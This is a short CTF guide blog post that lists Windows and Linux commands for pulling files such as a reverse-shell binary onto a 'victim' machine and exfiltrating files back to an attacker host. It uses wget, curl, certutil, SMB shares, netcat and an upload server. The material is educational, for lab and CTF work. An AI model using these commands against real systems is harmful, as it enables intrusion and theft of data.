---
categories:
- Guides
layout: post
image:
  path: preview.png
media_subpath: /assets/posts/2025-06-30-eus
tags:
- linux
- windows
title: CTF Exfiltrating & Uploading Simplified
---

Exfiltration & uploading are a critical component when it comes to CTFs, without this, most internal files or exploits cannot be uploaded or exfiltrated. In this post, I will discuss some Linux and Windows commands which can help you upload & exfiltrate to and from a victim's PC.

## Windows
Windows thankfully has built in functions which can be exploited to upload & download files to and from your attacker machine.
### Downloading
There are a few neat ways to Download files from a victims machine.
```
// Commands (Look up gtfobins for more info on this)
[Kali] python3 -m http.server 8080 // host your files here
[Victim] wget http://your_ip:port/file.exe .
[Victim] curl.exe --output file.exe --url http://your_ip:8080/file.exe 
[Victim] certutil.exe -urlcache -f "http://your_ip:8080/file.exe" outputFileName 

// SMB
[Host] impacket-smbserver shareName . // the . represents current directory, you can have this as /usr/share/windows-binaries etc.
[Victim] copy \\10.10.10.10\\shareName\\rev.exe C:\Users\Mike\rev.exe

// If all else fails:
$client = new-object System.Net.WebClient
$client.DownloadFile("http://kali_ip/file.txt","C:\tmp\file.txt") // file you want : file destination
```

### Exfiltrating
```
// SMB
[Kali] impacket-smbserver.py tmp /tmp/
[Victim] \\$IP$\tmp // visit this in Explorer
// Alternative
[Victim-PS] copy-item <target file> \\<kali ip>\<share name>\<destination file name>
```

## Linux

### Downloading
Linux has several built-in options available by default on most distros.
```
[Kali] python3 -m http.server 8000
[Victim] wget http://your_ip:8000/file.exe .
[Victim] curl --output file.exe --url http://your_ip:8080/file.exe 

// SSH (SCP)
[Kali to Victim] scp file.exe victim@ip_address:/home/victim_name
[Victim to Kali] scp your_username@ip_address:/path/file.exe .
```


### Exfiltrating
```
[Kali] python3 -m http.server 80
[Victim] wget http://your_ip:8080/file.exe .

// Alternatives
Upload nc to the victim's PC (use literally any method)
[Kali] nc -lvnp 4444 > exfiltrated.txt
[Victim] nc kali_ip 4444 < exfiltrated.txt

// Python
[Kali] python3 -m uploadserver 8080 // install it with: python3 -m pip install --user uploadserver
[Victim] curl -X POST -F "files=@dog.txt" http://10.135.162.3:8080/upload
```

There are of course many different ways to upload and exfiltrate data, I highly suggest exploring [gtfobins](https://gtfobins.github.io) for different ways of exfiltrating and uploading data. <br>
Just remember, most CTFs will most likely (99% of the time) have wget, curl and python installed by default.

**Last updated: 30/06/2025**